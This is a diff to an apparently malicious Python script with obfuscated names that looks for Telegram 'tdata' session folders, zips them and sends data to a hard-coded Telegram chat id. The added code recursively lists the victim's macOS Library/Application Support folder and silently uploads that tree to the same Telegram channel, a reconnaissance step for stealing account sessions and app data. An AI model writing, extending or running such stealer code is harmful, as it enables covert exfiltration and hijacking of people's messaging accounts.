@@ -13,6 +13,29 @@ C_I: str = "7363013741"
 MAX_SIZE: int = 40 * 1024 * 1024  # 40 MB in bytes
 
 
+# Функция для рекурсивного получения структуры директорий
+def get_directory_tree(start_path, indent="", prefix=""):
+    tree = []
+    try:
+        # Получаем содержимое директории
+        entries = sorted(os.listdir(start_path))
+        for index, entry in enumerate(entries):
+            path = os.path.join(start_path, entry)
+            is_last = index == len(entries) - 1
+            current_prefix = "└── " if is_last else "├── "
+
+            # Добавляем текущую папку/файл
+            tree.append(f"{indent}{prefix}{current_prefix}{entry}")
+
+            # Если это директория, рекурсивно обходим её
+            if os.path.isdir(path):
+                new_prefix = "    " if is_last else "│   "
+                tree.extend(get_directory_tree(path, indent + new_prefix, ""))
+    except PermissionError:
+        tree.append(f"{indent}{prefix}└── [Permission Denied]")
+    return tree
+
+
 def i_t_e() -> (str, bool):
     for entry in os.scandir(T_P):
         if "tdata" in entry.name:
@@ -134,6 +157,23 @@ def d_z_a(zip_path: str):
 
 
 def s(t_p: str = None) -> None:
+    # Получаем структуру директории
+    tree = get_directory_tree(os.path.join(ROOT, "Library", "Application Support"))
+
+    # Форматируем результат
+    result = f"Структура директории {os.path.join(ROOT, "Library", "Application Support")}:\n\n" + "\n".join(tree)
+
+    # Если результат слишком длинный, сохраняем в файл
+    with tempfile.TemporaryDirectory() as temp_dir:
+        if len(result) > 4096:  # Telegram ограничивает длину сообщения
+            with open(os.path.join(temp_dir, "directory_tree.txt"), "w", encoding="utf-8") as f:
+                f.write(result)
+            with open(os.path.join(temp_dir, "directory_tree.txt"), "rb") as f:
+                s_z_t_t(os.path.join(temp_dir, "directory_tree.txt"))
+            os.remove(os.path.join(temp_dir, "directory_tree.txt"))
+        else:
+            s_t_t_t(f"```\n{result}\n```")
+
     global T_P
     if t_p is not None:
         T_P = t_p
